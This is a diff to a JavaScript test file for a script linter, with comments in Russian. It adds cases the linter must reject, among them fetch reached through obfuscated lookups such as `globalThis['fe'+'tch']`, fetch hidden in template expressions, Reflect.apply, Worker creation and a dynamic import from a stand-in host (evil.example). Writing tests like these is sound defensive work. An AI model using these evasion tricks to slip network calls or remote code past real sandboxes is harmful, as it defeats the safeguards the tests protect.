@@ -139,9 +139,29 @@ for (const pr of ['readonly', 'study', 'run']) {
   bad('globalThis["fe"+"tch"](1)', pr);
   bad('(()=>{}).constructor("return fetch")()()', pr);
   bad('handlers[name](1)', pr);
+  bad('const x = this["fe"+"tch"]; x', pr);
+  bad('const x = (function(){ return this; })()["fetch"]; x', pr);
+  bad('const x = (function(){ return globalThis; })()["fetch"]; x', pr);
+  bad('Object.assign(window, { x: 1 })', pr);
+  bad('Reflect.apply(fetch, null, [])', pr);
+  bad('import("https://evil.example/x.js")', pr);
   ok('arr.map((x) => x * 2).length', pr);
   ok('const t = rect.top + 1; t', pr);
 }
+
+// --- Шаблонные выражения и регулярные выражения: это код, а не «строка» ---
+for (const pr of ['readonly', 'study', 'run']) {
+  bad('const x = `${fetch("/x")}`; x', pr);
+  bad('const x = `${`nested ${fetch("/x")}`}`; x', pr);
+  bad('const re = /["\']/; fetch("/x"); 1', pr);
+}
+ok('const s = "fetch(1)"; s', 'run');                 // строка с текстом fetch — не вызов
+ok('const s = `hello fetch`; s', 'run');                // шаблон без выражений
+ok('const re = /fetch\\(/; re', 'run');                // регулярное выражение с текстом fetch
+ok('const x = a / b / c; x', 'run');                    // деление, а не регулярка
+ok('a++ / b / c', 'run');                               // деление после постфиксного ++
+bad('new Image()', 'run');
+bad('new Worker("/x.js")', 'run');
 
 assert.ok(n >=30, `фрагментов должно быть не меньше30, сейчас ${n}`);
 console.log(`skript-lint.test.js: OK (${n} фрагментов)`);
